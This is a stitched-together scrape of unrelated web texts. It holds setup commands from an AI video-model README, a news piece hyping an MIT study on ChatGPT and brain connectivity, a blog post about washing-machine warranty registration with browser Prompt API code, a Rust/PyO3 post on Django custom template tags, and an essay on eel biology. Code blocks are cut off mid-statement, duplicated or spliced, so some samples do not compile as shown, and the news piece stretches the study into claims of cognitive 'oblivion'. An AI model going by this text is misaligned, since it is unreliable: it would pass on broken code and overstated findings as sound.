    &lt;p&gt;In case of running into float point exception(core dump) on the specific GPU type, you may try the following solutions:&lt;/p&gt;
    &lt;code&gt;# Making sure you have installed CUDA 12.4, CUBLAS&amp;gt;=12.4.5.8, and CUDNN&amp;gt;=9.00 (or simply using our CUDA 12 docker image).
pip install nvidia-cublas-cu12==12.4.5.8
export LD_LIBRARY_PATH=/opt/conda/lib/python3.8/site-packages/nvidia/cublas/lib/&lt;/code&gt;
    &lt;p&gt;To create your own input conditions, you also need to install the following dependencies:&lt;/p&gt;
    &lt;code&gt;pip install --no-deps git+https://github.com/microsoft/MoGe.git
pip install scipy==1.11.4
pip install git+https://github.com/EasternJournalist/utils3d.git@c5daf6f6c244d251f252102d09e9b7bcef791a38&lt;/code&gt;

    --flow-shift 7.0 \
    --seed 0 \
    --embedded-cfg-scale 6.0 \
    --use-cpu-offload \
    --save-path ./results&lt;/code&gt;
    &lt;p&gt;You can add "--use-context-block" to add the context block in the inference.&lt;/p&gt;
    &lt;p&gt;xDiT is a Scalable Inference Engine for Diffusion Transformers (DiTs) on multi-GPU Clusters. It has successfully provided low-latency parallel inference solutions for a variety of DiTs models, including mochi-1, CogVideoX, Flux.1, SD3, etc. This repo adopted the Unified Sequence Parallelism (USP) APIs for parallel inference of the HunyuanVideo-I2V model.&lt;/p&gt;
    &lt;p&gt;For example, to generate a video with 8 GPUs, you can use the following command:&lt;/p&gt;
    &lt;code&gt;cd HunyuanWorld-Voyager

ALLOW_RESIZE_FOR_SP=1 torchrun --nproc_per_node=8 \
    sample_image2video.py \
    --model HYVideo-T/2 \
    --input-path "examples/case1" \
    --prompt "An old-fashioned European village with thatched roofs on the houses." \
    --i2v-stability \
    --infer-steps 50 \
    --flow-reverse \
    --flow-shift 7.0 \
    --seed 0 \
    --embedded-cfg-scale 6.0 \
    --save-path ./results \
    --ulysses-degree 8 \
    --ring-degree 1&lt;/code&gt;
    &lt;p&gt;The number of GPUs equals the product of &lt;code&gt;--ulysses-degree&lt;/code&gt; and &lt;code&gt;--ring-degree.&lt;/code&gt; Feel free to adjust these parallel configurations to optimize performance.&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="4"&gt;
        &lt;cell role="head"&gt;Latency (Sec) for 512x768 (49 frames 50 steps) on 8 x H20 GPU&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;1&lt;/cell&gt;
        &lt;cell&gt;2&lt;/cell&gt;
        &lt;cell&gt;4&lt;/cell&gt;
        &lt;cell&gt;8&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;1925&lt;/cell&gt;
        &lt;cell&gt;1018 (1.89x)&lt;/cell&gt;
        &lt;cell&gt;534 (3.60x)&lt;/cell&gt;
        &lt;cell&gt;288 (6.69x)&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;We also provide a Gradio demo for the HunyuanWorld-Voyager model.&lt;/p&gt;
    &lt;p&gt;You can run the following command to start the demo:&lt;/p&gt;
    &lt;code&gt;cd HunyuanWorld-Voyager

python3 app.py&lt;/code&gt;
    &lt;p&gt;You need to first upload an image and choose a camera direction to create a condition video. Then, you can type your text prompt and generate the final RGB-D video.&lt;/p&gt;
    &lt;p&gt;We also release the data engine of HunyuanWorld-Voyager, which can be used to generate scalable data for RGB-D video training. Please refer to data_engine for more details.&lt;/p&gt;

  &lt;main&gt;
    &lt;p&gt;A new MIT study titled, Your Brain on ChatGPT: Accumulation of Cognitive Debt when Using an AI Assistant for Essay Writing Task, has found that using ChatGPT to help write essays leads to long-term cognitive harm—measurable through EEG brain scans. Students who repeatedly relied on ChatGPT showed weakened neural connectivity, impaired memory recall, and diminished sense of ownership over their own writing. While the AI-generated content often scored well, the brains behind it were shutting down.&lt;/p&gt;
    &lt;p&gt;The findings are clear: Large Language Models (LLMs) like ChatGPT and Grok don’t just help students write—they train the brain to disengage. Here’s what the researchers found:&lt;/p&gt;
    &lt;head rend="h4"&gt;Brain Connectivity Declines with AI Use&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;p&gt;EEG scans revealed a systematic scaling down of neural connectivity in the brain with increasing reliance on external tools:&lt;/p&gt;
        &lt;list rend="ul"&gt;
          &lt;item&gt;
            &lt;p&gt;Brain-only group: strongest, most widespread connectivity.&lt;/p&gt;
          &lt;/item&gt;
          &lt;item&gt;
            &lt;p&gt;Search Engine group: intermediate.&lt;/p&gt;
          &lt;/item&gt;
          &lt;item&gt;
            &lt;p&gt;LLM group: weakest connectivity across alpha, beta, delta, and theta bands.&lt;/p&gt;
          &lt;/item&gt;
        &lt;/list&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;LLM use resulted in under-engagement of critical attention and visual processing networks, especially in Session 4 when participants tried to write without AI.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h4"&gt;LLM Users Forget What They Just Wrote&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;p&gt;In post-task interviews:&lt;/p&gt;
        &lt;list rend="ul"&gt;
          &lt;item&gt;
            &lt;p&gt;83.3% of LLM users were unable to quote even one sentence from the essay they had just written.&lt;/p&gt;
          &lt;/item&gt;
          &lt;item&gt;
            &lt;p&gt;In contrast, 88.9% of Search and Brain-only users could quote accurately.&lt;/p&gt;
          &lt;/item&gt;
        &lt;/list&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;0% of LLM users could produce a correct quote, while most Brain-only and Search users could.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h4"&gt;AI Use Disrupts Memory and Learning Pathways&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;p&gt;Participants previously using LLMs (then writing without it in Session 4) showed:&lt;/p&gt;
        &lt;list rend="ul"&gt;
          &lt;item&gt;
            &lt;p&gt;Weaker memory recall&lt;/p&gt;
          &lt;/item&gt;
          &lt;item&gt;
            &lt;p&gt;Lower alpha and beta neural engagement&lt;/p&gt;
          &lt;/item&gt;
          &lt;item&gt;
            &lt;p&gt;Signs of cognitive adaptation toward passivity and “efficiency” at the cost of effortful learning.&lt;/p&gt;
          &lt;/item&gt;
        &lt;/list&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h4"&gt;LLM Users Felt Detached From Their Work&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;p&gt;When asked about authorship:&lt;/p&gt;
        &lt;list rend="ul"&gt;
          &lt;item&gt;
            &lt;p&gt;LLM users gave responses like “50/50” or “70% mine.”&lt;/p&gt;
          &lt;/item&gt;
          &lt;item&gt;
            &lt;p&gt;Some claimed no ownership at all.&lt;/p&gt;
          &lt;/item&gt;
          &lt;item&gt;
            &lt;p&gt;Brain-only group participants almost universally reported full ownership.&lt;/p&gt;
          &lt;/item&gt;
        &lt;/list&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h4"&gt;Switching from LLM to Brain Use Doesn’t Fully Restore Function&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;p&gt;Session 4: LLM-to-Brain participants showed lingering cognitive deficiency, failing to return to their original (Session 1) brain activity patterns.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Their neural activity remained below baseline, even after AI use was stopped.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h4"&gt;Search Engine Users Showed Healthier Brain Engagement&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;p&gt;Search users maintained stronger executive function, memory activation, and quote recall.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;EEG data showed more robust occipital and parietal activation supporting visual processing and cognitive effort.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h4"&gt;AI Dependency Leads to “Cognitive Offloading”&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;p&gt;Researchers noted a trend toward neural efficiency adaptation: the brain essentially “lets go” of the effort required for synthesis and memory.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;This adaptation led to passivity, minimal editing, and low integration of concepts.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h4"&gt;Short-Term Gains, Long-Term Cognitive Debt&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;p&gt;Despite receiving decent scores from judges, the LLM group’s writing:&lt;/p&gt;
        &lt;list rend="ul"&gt;
          &lt;item&gt;
            &lt;p&gt;Lacked strategic integration.&lt;/p&gt;
          &lt;/item&gt;
          &lt;item&gt;
            &lt;p&gt;Used fewer diverse structures.&lt;/p&gt;
          &lt;/item&gt;
          &lt;item&gt;
            &lt;p&gt;Was shorter and more robotic.&lt;/p&gt;
          &lt;/item&gt;
        &lt;/list&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Over time, the group showed a consistent decline in engagement, performance, and self-reported satisfaction.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Based on this study, as more of the global population begins to rely on artificial intelligence to complete complex tasks, our cognitive abilities and creative capacities appear poised to take a nosedive into oblivion.&lt;/p&gt;
    &lt;p&gt;One thing is clear: if you currently use AI, take regular breaks—and give your own mind the chance to do the work. Otherwise, you may face severe cognitive harm and dependence.&lt;/p&gt;
    &lt;p&gt;The machines aren’t just taking over our work—they’re taking over our minds.&lt;/p&gt;

  &lt;main&gt;
    &lt;head rend="h1"&gt;For all that's holy, can you just leverage the Web, please?&lt;/head&gt;
    &lt;p&gt;When I moved in with my wife Laura in 2005, we lived in a shared apartment in Barcelona that had an ancient washing machine that was just there already, no idea who initially bought it. I managed to break the washing machine door's closing mechanism some time in 2006, so for a few weeks, whenever we did the washing, we had to lean a chair against the door so it wouldn't open. At the time, we were both students and living on a small budget.&lt;/p&gt;
    &lt;p&gt;Eventually, later in the same year, we bought an Electrolux machine that has accompanied us ever since. First on our move to Hamburg, then there through three apartments, and finally back to Spain, where we live now in the Catalonian countryside. Anyway, the washing machine had a motor damage last week, so after almost 20 years, it was time for a new one. I ordered it online (another Electrolux, without Internet nor WiFi), it was delivered swiftly, and I installed it hopefully correctly.&lt;/p&gt;
    &lt;p&gt;The washing machine came with a voluntary 10 year warranty if you registered it. The brochure where this offer was announced featured a free telephone number and a QR code that pointed at the number (in plain text, not making use of the &lt;code&gt;tel:&lt;/code&gt; protocol). I called the number, and to my absolute surprise there were currently more callers than usual. After about 20 minutes, I had an agent on the phone, but after saying what I wanted, they just hung up on me (or the connection cut, whatever). Fine, I called again, but now, the call center was over capacity and they didn't even let me enter in the wait loop.&lt;/p&gt;
    &lt;p&gt;They did offer to send me a link to a chat service on their website via SMS, though, so I went for that option. The SMS literally pointed me at something like &lt;code&gt;https://www.&lt;/code&gt; broken up by a space and then &lt;code&gt;example.com/gc/&lt;/code&gt;. When I clicked the linkified &lt;code&gt;example.com/gc/&lt;/code&gt;, I ended up on a broken site whose certificate wasn't trusted. After fixing the link manually and prepending the &lt;code&gt;https://www.&lt;/code&gt; part, the page didn't load.&lt;/p&gt;
    &lt;p&gt;At this point I was close to giving up, but I had one last card that I wanted to play: I searched Google for "electrolux warranty register", and it pointed me at a site &lt;code&gt;https://www.example.com/mypages/register-a-product/&lt;/code&gt; as the first result. This looked promising. The &lt;code&gt;mypages&lt;/code&gt; already suggested that this was gated behind a login, so I created an account, which was painless. (Turns out, after having an account and being logged in, the chat URL also worked—what an oversight on their part.) On the page, they had a field where you could enter the washing machine's product number from the identification plate on the door of the washing machine, together with helpful information where to find the data.&lt;/p&gt;
    &lt;p&gt;But even better, they offered a service where you could just upload a picture of the identification plate, and some AI on their server then extracted the product number and let you register the product with two clicks. What a fantastic experience compared to the crappy (and likely for the operator way more expensive) call center experience.&lt;/p&gt;
    &lt;p&gt;Why they didn't just put this URL on the brochure and the QR code is beyond me. As the title suggests: For all that's holy, can you just leverage the Web, please? Don't make me talk to people! They could still offer to register the machine by telephone as an alternative, but in 2025, the default for such things should just be the Web.&lt;/p&gt;
    &lt;head rend="h2"&gt;Bonus&lt;/head&gt;
    &lt;p&gt;Since I work on built-in AI as my day job in the Chrome team at Google, I could not not notice this "extract the product number from this identification plate" use case for client-side AI. I coded up a quick demo using the Prompt API embedded below that shows this in action. Here's a quick walkthrough of the code:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Create a session with the &lt;code&gt;LanguageModel&lt;/code&gt;, informing the user of download progress if the model needs to be downloaded, and telling the model about the to-be-expected inputs (English texts and images) and outputs (English texts). In the system prompt, I tell the model what its overall task is (identify product numbers from photos of identification plates).&lt;/item&gt;
      &lt;item&gt;Prompt the model using the &lt;code&gt;promptStreaming()&lt;/code&gt;method with a multimodal prompt, one textual and one image. The Prompt API supports structured output in the form of a JSON Schema or regular expression. Product numbers have nine digits, so I pass the regular expression&lt;code&gt;/\d{9}/&lt;/code&gt;as the&lt;code&gt;responseConstraint&lt;/code&gt;option.&lt;/item&gt;
      &lt;item&gt;Iterate over the chunks of the response. Since I'm just expecting nine digits, this is probably a bit overkill, but, hey…&lt;/item&gt;
      &lt;item&gt;(Not shown) On the server, verify that the recognized product number actually exist. Companies typically have some sort of verification rules like checksums, or washing machine product numbers always start with &lt;code&gt;91&lt;/code&gt;or something. If you know those rules, you can of course make them part of the&lt;code&gt;responseConstraint&lt;/code&gt;, but you always need to verify untrusted user input (which the output of an LLM counts as) on the server.&lt;/item&gt;
    &lt;/list&gt;
    &lt;code&gt;const session = await LanguageModel.create({
  monitor(m) {
    m.addEventListener('downloadprogress', (e) =&amp;gt; {
      console.log(`Downloaded ${e.loaded * 100}%.`);
    });
  },
  expectedInputs: [{ type: 'text', languages: ['en'] }, { type: 'image' }],
  expectedOutputs: [{ type: 'text', languages: ['en'] }],
  initialPrompts: [
    {
      role: 'system',
      content:
        'Your task is to identify product numbers from photos of identification plates.',
    },
  ],
});

const stream = session.promptStreaming(
  [
    {
      role: 'user',
      content: [

    &lt;head rend="h2"&gt;Background&lt;/head&gt;
    &lt;p&gt;As part of my ongoing project to reimplement Django’s templating language in Rust, I have been adding support for custom template tags.&lt;/p&gt;
    &lt;head rend="h3"&gt;Simple tags&lt;/head&gt;
    &lt;p&gt;The simplest custom tag will look something like:&lt;/p&gt;
    &lt;code&gt;# time_tags.py
from datetime import datetime
from django import template

register = template.Library()


@register.simple_tag
def time(format_string):
  now = datetime.now()
  return now.strftime(format_string)
&lt;/code&gt;
    &lt;code&gt;# time_tags.py
from datetime import datetime
from django import template

register = template.Library()


@register.simple_tag
def current_time(format_string):
    return datetime.now().strftime(format_string)
&lt;/code&gt;
    &lt;p&gt;This can then be used in a Django template like:&lt;/p&gt;
    &lt;code&gt;{% load time from time_tags %}
&amp;lt;p&amp;gt;Time: {% time '%H:%M:%S' %}&amp;lt;/p&amp;gt;
&lt;/code&gt;
    &lt;code&gt;{% load current_time from time_tags %}
&amp;lt;p&amp;gt;The time is {% current_time '%H:%M:%S' %}&amp;lt;/p&amp;gt;
&lt;/code&gt;
    &lt;head rend="h3"&gt;The context&lt;/head&gt;
    &lt;p&gt;Django’s templating language uses an object called a &lt;code&gt;context&lt;/code&gt; to provide dynamic data to the template renderer. This mostly behaves like a Python dictionary.&lt;/p&gt;
    &lt;head&gt;details&lt;/head&gt;
    &lt;p&gt;Technically, Django’s context contains a list of dictionaries. This allows for temporarily changing the value of a variable, for example within a &lt;code&gt;{% for %}&lt;/code&gt; loop, while keeping the old value for later use.&lt;/p&gt;
    &lt;p&gt;A simple tag can be defined that takes the &lt;code&gt;context&lt;/code&gt; as the first variable:&lt;/p&gt;
    &lt;code&gt;# time_tags.py
from datetime import datetime
from django import template

register = template.Library()


@register.simple_tag(
    takes_context=True)
def time(context, format_string):
  timezone = context["timezone"]
  now = datetime.now(tz=timezone)
  return now.strftime(format_string)
&lt;/code&gt;
    &lt;code&gt;# time_tags.py
from datetime import datetime
from django import template

register = template.Library()


@register.simple_tag(takes_context=True)
def current_time(context, format_string):
    timezone = context["timezone"]
    return datetime.now(tz=timezone).strftime(format_string)
&lt;/code&gt;
    &lt;head rend="h2"&gt;Django Rusty Templates&lt;/head&gt;
    &lt;p&gt;In Django Rusty Templates, I have defined a &lt;code&gt;context&lt;/code&gt; as a Rust &lt;code&gt;struct&lt;/code&gt;. Here’s a simplified version:&lt;/p&gt;
    &lt;code&gt;pub struct Context {
  context: HashMap&amp;lt;
    String, Py&amp;lt;PyAny&amp;gt;&amp;gt;,
}
&lt;/code&gt;
    &lt;code&gt;pub struct Context {
    context: HashMap&amp;lt;String, Py&amp;lt;PyAny&amp;gt;&amp;gt;,
}
&lt;/code&gt;
    &lt;p&gt;When rendering a template tag, the context is passed to the &lt;code&gt;render&lt;/code&gt; method as a mutable reference:&lt;/p&gt;
    &lt;code&gt;trait Render {
  fn render(
    &amp;amp;self,
    py: Python&amp;lt;'_&amp;gt;,
    context: &amp;amp;mut Context,
  ) -&amp;gt; RenderResult;
}
&lt;/code&gt;
    &lt;code&gt;trait Render {
    fn render(
        &amp;amp;self,
        py: Python&amp;lt;'_&amp;gt;,
        context: &amp;amp;mut Context,
    ) -&amp;gt; RenderResult;
}
&lt;/code&gt;
    &lt;p&gt;This is natural when working purely in Rust but custom template tags require passing the context to Python, which doesn’t understand Rust lifetimes.&lt;/p&gt;
    &lt;p&gt;The standard way of connecting Python and Rust is with PyO3. To pass a Rust type to Python, we can wrap it in a &lt;code&gt;#[pyclass]&lt;/code&gt;:&lt;/p&gt;
    &lt;code&gt;#[pyclass]
struct PyContext {
  context: Context,
}

#[pymethods]
impl PyContext {
  // Methods for Python to read from
  // the context
}
&lt;/code&gt;
    &lt;code&gt;#[pyclass]
struct PyContext {
    context: Context,
}

#[pymethods]
impl PyContext {
    // Methods for Python to read from the context
}
&lt;/code&gt;
    &lt;p&gt;And then we can create this in our &lt;code&gt;render&lt;/code&gt; method:&lt;/p&gt;
    &lt;code&gt;struct CustomTag {
  func: Py&amp;lt;PyAny&amp;gt;,
  takes_context: bool,
}

impl Render for CustomTag {
  fn render(
    &amp;amp;self,
    py: Python&amp;lt;'_&amp;gt;,
    context: &amp;amp;mut Context,
  ) -&amp;gt; RenderResult {
    if self.takes_context {
      let py_context =
        PyContext { context };
      let content = self.func
        .bind(py)
        .call1((py_context,))?;
      Ok(content.to_string())
    }
  }
}
&lt;/code&gt;
    &lt;code&gt;struct CustomTag {
    func: Py&amp;lt;PyAny&amp;gt;,
    takes_context: bool,
}

impl Render for CustomTag {
    fn render(
        &amp;amp;self,
        py: Python&amp;lt;'_&amp;gt;,
        context: &amp;amp;mut Context,
    ) -&amp;gt; RenderResult {
        if self.takes_context {
            let py_context = PyContext { context };
            let content = self.func.bind(py).call1((py_context,))?;
            Ok(content.to_string())
        }
    }
}
&lt;/code&gt;
    &lt;p&gt;Unfortunately, this doesn’t compile because &lt;code&gt;PyContext&lt;/code&gt; requires an owned value, not a mutable reference:&lt;/p&gt;
    &lt;code&gt;error[E0308]: mismatched types
   --&amp;gt; src/render/tags.rs:807:40

            found `&amp;amp;mut Context`

&lt;/code&gt;
    &lt;head rend="h2"&gt;Turning a mutable reference into an owned value&lt;/head&gt;
    &lt;p&gt;To make progress, we need to find a way to get an owned version of &lt;code&gt;context&lt;/code&gt;. To do this, I turned to &lt;code&gt;std::mem::take&lt;/code&gt;, which replaces the data pointed to by &lt;code&gt;&amp;amp;mut context&lt;/code&gt; with an empty value (via the &lt;code&gt;Default&lt;/code&gt; trait) and returns an owned value:&lt;/p&gt;
    &lt;code&gt;#[derive(Default)]
pub struct Context {
  context: HashMap&amp;lt;
    String, Py&amp;lt;PyAny&amp;gt;&amp;gt;,
}

impl Render for CustomTag {
  fn render(
    &amp;amp;self,
    py: Python&amp;lt;'_&amp;gt;,
    context: &amp;amp;mut Context,
  ) -&amp;gt; RenderResult {
    if self.takes_context {
      let context =
        std::mem::take(context);
      let py_context =
        PyContext { context };
      let content = self.func
        .call1(py, (py_context,))?;
      Ok(content.to_string())
    }
  }
}
&lt;/code&gt;
    &lt;code&gt;#[derive(Default)]
pub struct Context {
  context: HashMap&amp;lt;String, Py&amp;lt;PyAny&amp;gt;&amp;gt;,
}

impl Render for CustomTag {
    fn render(
        &amp;amp;self,
        py: Python&amp;lt;'_&amp;gt;,
        context: &amp;amp;mut Context,
    ) -&amp;gt; RenderResult {
        if self.takes_context {
            let context = std::mem::take(context);
            let py_context = PyContext { context };
            let content = self.func.call1(py, (py_context,))?;
            Ok(content.to_string())
        }
    }
}
&lt;/code&gt;
    &lt;head rend="h2"&gt;Moving the owned value back into the mutable reference&lt;/head&gt;
    &lt;p&gt;This works very well for giving Python access to the &lt;code&gt;context&lt;/code&gt;. However, once the custom tag’s rendering logic has run we need to regain ownership of the &lt;code&gt;context&lt;/code&gt; for use in other Rust tags. To do this, we turn to &lt;code&gt;std::mem::replace&lt;/code&gt;:&lt;/p&gt;
    &lt;code&gt;impl Render for CustomTag {
  fn render(
    &amp;amp;self,
    py: Python&amp;lt;'_&amp;gt;,
    context: &amp;amp;mut Context,
  ) -&amp;gt; RenderResult {
    if self.takes_context {
      let swapped_context =
        std::mem::take(
          swapped_context);
      let py_context = PyContext {
          context: swapped_context
      };
      let content = self.func
        .call1(py, (py_context,))?;
      let _ = std::mem::replace(
        context,
        py_context.context);
      Ok(content.to_string())
    }
  }
}
&lt;/code&gt;
    &lt;code&gt;impl Render for CustomTag {
    fn render(
        &amp;amp;self,
        py: Python&amp;lt;'_&amp;gt;,
        context: &amp;amp;mut Context,
    ) -&amp;gt; RenderResult {
        if self.takes_context {
            let swapped_context = std::mem::take(context);
            let py_context = PyContext { context: swapped_context };
            let content = self.func.call1(py, (py_context,))?;
            let _ = std::mem::replace(context, py_context.context);
            Ok(content.to_string())
        }
    }
}
&lt;/code&gt;
    &lt;p&gt;Unfortunately, this again does not compile:&lt;/p&gt;
    &lt;code&gt;error[E0382]: use of moved value:

&lt;/code&gt;
    &lt;p&gt;To get around this, we can use an &lt;code&gt;Arc&lt;/code&gt; (atomic reference count) to send Python a clone of &lt;code&gt;py_context&lt;/code&gt; rather than moving it out of scope. We can also remove the &lt;code&gt;context&lt;/code&gt; from the &lt;code&gt;Arc&lt;/code&gt; with &lt;code&gt;Arc::try_unwrap&lt;/code&gt;:&lt;/p&gt;
    &lt;code&gt;#[pyclass]
#[derive(Clone)]
struct PyContext {
  context: Arc&amp;lt;Context&amp;gt;,
}

impl Render for CustomTag {
  fn render(
    &amp;amp;self,
    py: Python&amp;lt;'_&amp;gt;,
    context: &amp;amp;mut Context,
  ) -&amp;gt; RenderResult {
    if self.takes_context {
      let swapped_context =
        std::mem::take(
          swapped_context).into();
      let py_context = PyContext {
        context: swapped_context
      };
      let content = self.func.call1(
        py, (py_context.clone(),)?;
      let inner_context = match 
          Arc::try_unwrap(
            py_context.context) {
        Ok(inner_context) =&amp;gt; {
          inner_context
        }
        Err(_) =&amp;gt; todo!(),
      };
      let _ = std::mem::replace(
        context, inner_context);
      Ok(content.to_string())
    }
  }
}
&lt;/code&gt;
    &lt;code&gt;#[pyclass]
#[derive(Clone)]
struct PyContext {
    context: Arc&amp;lt;Context&amp;gt;,
}

impl Render for CustomTag {
    fn render(
        &amp;amp;self,
        py: Python&amp;lt;'_&amp;gt;,
        context: &amp;amp;mut Context,
    ) -&amp;gt; RenderResult {
        if self.takes_context {
            let swapped_context = std::mem::take(context);
            let py_context = PyContext { context: swapped_context };
            let content = self.func.call1(py, (py_context.clone(),))?;
            let inner_context = match Arc::try_unwrap(py_context.context) {
                Ok(inner_context) =&amp;gt; inner_context,

            Ok(content.to_string())
        }
    }
}
&lt;/code&gt;
    &lt;p&gt;This works great when Python doesn’t keep a reference to the &lt;code&gt;PyContext&lt;/code&gt; object. This means the reference count of the &lt;code&gt;Arc&lt;/code&gt; is one and &lt;code&gt;Arc::try_unwrap&lt;/code&gt; will succeed. If the custom tag implementation keeps a reference around for some reason, we cannot take ownership. Instead we must fall back to cloning the inner context:&lt;/p&gt;
    &lt;code&gt;#[derive(Default)]
pub struct Context {
  context: HashMap&amp;lt;
    String, Py&amp;lt;PyAny&amp;gt;&amp;gt;,

            Ok(content.to_string())
        }
    }
}
&lt;/code&gt;
    &lt;p&gt;Note that we need to use the &lt;code&gt;clone_ref&lt;/code&gt; method instead of &lt;code&gt;clone&lt;/code&gt; because this handles Python’s reference counts correctly.&lt;/p&gt;
    &lt;head rend="h2"&gt;Mutating the context from Python&lt;/head&gt;
    &lt;p&gt;This is sufficient to grant Python read-only access to the &lt;code&gt;context&lt;/code&gt;, but the &lt;code&gt;context&lt;/code&gt; is designed to be mutated. To enable this, we need to protect the &lt;code&gt;context&lt;/code&gt; from being mutably accessed from multiple threads. To do this, we can use a &lt;code&gt;Mutex&lt;/code&gt;, along with PyO3’s &lt;code&gt;MutexExt&lt;/code&gt; trait which provides the &lt;code&gt;lock_py_attached&lt;/code&gt; method to avoid deadlocking with the Python interpreter:&lt;/p&gt;
    &lt;code&gt;use pyo3::sync::MutexExt;

    &lt;p&gt;The inability of PyO3 to expose Rust structs that use lifetimes initially seems limiting, but PyO3 and Rust provide powerful tools to work around these limitations. &lt;code&gt;std::mem::take&lt;/code&gt;, &lt;code&gt;std::mem::replace&lt;/code&gt; and &lt;code&gt;std::mem::swap&lt;/code&gt; allow for advanced manipulation of mutable references and owned values and &lt;code&gt;Arc&lt;/code&gt; and &lt;code&gt;Mutex&lt;/code&gt; are extremely useful for exposing shared mutable data to Python. PyO3’s &lt;code&gt;MutexExt&lt;/code&gt; is essential for working with mutexes and Python together.&lt;/p&gt;
    &lt;p&gt;You can find the full code implementing a simple custom tag here, with the extra details I omitted here for brevity and clarity.&lt;/p&gt;

  &lt;main&gt;
    &lt;div&gt;
      &lt;p&gt;Let’s dive right in: for most of history, we didn’t really know where eels come from. Which is strange, because they’re everywhere—rivers, lakes, oceans. Even now, we only have the faintest sense of where they spawn or how. Their lives remain partly hidden, and that blank space has always invited stories.&lt;/p&gt;
      &lt;p&gt;Aristotle thought they slithered out of mud, giving the primordial ooze its first big break. Another tale claimed they rose from sea foam, like a grotesque remix of Aphrodite’s birth. Japanese folklore said eels began as earthworms blessed by the summer moon—plausible enough, if you consider being transformed into something both hideous and delicious a blessing. For millennia, our relationship with eels was governed by fables and speculation. Eventually, real science needed to step in.&lt;/p&gt;
      &lt;p&gt;One spat of scientific interest in eels came at the end of the 19th century. Scientists, lit up by the potential of Darwin’s new theory of evolution, believed they finally had the tools to crack the mysterious origins of eels: how they mated, where they were born, and where they eventually went to die. The scientists observed. They dissected. They experimented. And time after time, they kept hitting dead ends.&lt;/p&gt;
      &lt;p&gt;Here’s the story of one such dead end. The year is 1876, in the port of Trieste, Italy—then part of the Austro-Hungarian Empire. In a small lab, surrounded by jars of eels, briny seawater, and plenty of slime, a young zoology student works under orders from his doctoral advisor. His task: to solve the mystery of eels by capturing live specimens from the harbor and slitting open their bellies in search of testes. (The sexual mysteries of eels were anatomical as much as behavioral.) Day after day, he probed and sliced, logging hours at the dissection table. Four months later, he left empty-handed, without so much as a glimpse of a gonad. Upon his departure he wrote: “All I see when I close my eyes is the shimmering dead tissue, which haunts my dreams...” Yikes.&lt;/p&gt;
      &lt;p&gt;That student was Sigmund Freud, who later established psychotherapy as a discipline, using dream interpretation to uncover the hidden sexuality of his patients—truths beneath the surface that, like eel gonads, couldn’t be found through straightforward empirical methods. To overstate it: Freud went a little screwy looking for eel balls. (Or maybe he was already screwy enough to go looking for them.) The psychological case study almost writes itself: the same hidden drives that pushed a young researcher to spend four months searching for eel testes might also fuel a lifetime of theories about libido, repression, and desire. The link is tenuous, of course, but it’s fun to imagine the past 150 years of psychotherapy springing from Freud’s failed eel dissection project.&lt;/p&gt;
      &lt;p&gt;All these years later, no one has ever seen an Anguilla eel spawn. But scientists think they’ve at least found the place where it happens: a single location on earth where, strangely enough, no adult eel has ever been spotted. Deep in the Atlantic lies the Sargasso Sea—the only sea without land boundaries, defined instead by four great currents. Eels are born, quite literally, in the Bermuda Triangle.&lt;/p&gt;
      &lt;p&gt;The mystery cracked a little in 1896, about 20 years after Freud’s attempts, when Italian zoologist Giovanni Battista Grassi found a mature male eel with testes and sperm. He also linked a strange, transparent stubby fish called the Leptocephalus to the eel, noticing they shared the same oddly high number of vertebrae. Long thought to be its own species, the Leptocephalus turned out to be the eel’s larval stage—a dramatic transformation we’d never witnessed and had trouble connecting, since it happens far below, deep in the ocean.&lt;/p&gt;
      &lt;p&gt;Here’s what we now know: Eels begin as tiny, glassy specs suspended in the Sargasso’s deep blue. They drift for years, feeding on “marine snow” as currents carry them westward. By the time they reach Europe, they’ve transformed into glass eels—their juvenile state that is longer, flatter (but still translucent) with a defined backbone.&lt;/p&gt;
      &lt;p&gt;Then comes the climb out of the ocean. Glass eels push upstream into estuaries, crawling over river rocks and mud to find fresh water for their next metamorphosis. There, they shift again into elvers. The translucent jelly of their body becomes speckled with pigmentation and they develop an insatiable appetite.&lt;/p&gt;
      &lt;p&gt;After a couple of years of eating they bulk up into yellow eels. This adolescent form is the familiar eel seen wriggling in ponds, drawn up from wells, or fished from rivers. Eels can linger in their yellow form for decades, but eventually nature calls them back to the ocean.&lt;/p&gt;
